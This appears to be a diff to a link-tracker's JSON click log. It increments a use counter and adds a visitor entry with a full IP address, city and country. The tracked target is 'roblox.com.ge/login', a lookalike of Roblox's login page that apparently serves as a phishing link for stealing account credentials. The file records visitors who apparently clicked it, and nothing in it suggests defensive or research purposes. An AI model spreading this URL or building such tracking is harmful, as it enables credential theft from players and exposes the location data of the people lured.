@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1674,
+    "useCount": 1675,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13560,6 +13560,14 @@
         "city": "Chiang Mai",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777621548654,
+        "ip": "180.191.231.79",
+        "country": "Philippines",
+        "city": "Mandaue City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
